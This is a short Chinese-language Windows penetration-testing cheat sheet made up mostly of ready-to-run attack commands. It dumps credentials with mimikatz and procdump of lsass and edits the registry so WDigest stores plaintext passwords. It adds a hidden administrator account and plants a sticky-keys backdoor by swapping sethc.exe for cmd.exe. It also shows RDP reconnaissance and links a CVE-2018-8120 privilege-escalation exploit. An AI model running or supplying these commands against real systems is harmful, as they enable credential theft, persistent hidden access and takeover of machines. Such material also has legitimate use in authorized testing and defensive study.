# Windows渗透备忘录

### mimikatz

```
mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt


```
### procdump64.exe导出lsass.dmp

```
先用procdump64.exe导出lsass.dmp
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
命令执行完成之后，会有提示下载路径。

然后把 lsass.dmp 下载到本地(实战中可以从菜刀下载或者网站访问下载等等)

使用本地的mimikatz.exe读取lsass.dmp。
```
修改注册表保存明文
```
但是我们可以通过修改注册表来让Wdigest Auth保存明文口令：

reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
###  添加用户

```
net user cmc Nqpqsnm123 /add

net localgroup administrators cmc /add

net user cmc$ Nqpqsnm123 /add
```

### 查看rdp端口

```
tasklist /svc |  findstr "TermService"

netstat -ano

REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
```

```
 3389记录获取：wevtutil.exe qe security "/q:*[System [(EventID=4624)]]"/f:text /rd:true /c:100 > c:\sys.txt     100是条数
```

### Shift后门

替换system32下的sethc.exe为cmd.exe

关闭远程桌面的

![image-20191107102719394.png](https://i.loli.net/2019/11/07/UY6mtA1eZOWRHxf.png)

使用Kali rdesktop 

## 创建注册表隐藏用户

 [https://blog.csdn.net/abcd51685168/article/details/41854981]( https://blog.csdn.net/abcd51685168/article/details/41854981 ) 

### 提权工具

#### 2018-8120

 [https://github.com/unamer/CVE-2018-8120]( https://github.com/unamer/CVE-2018-8120 ) 

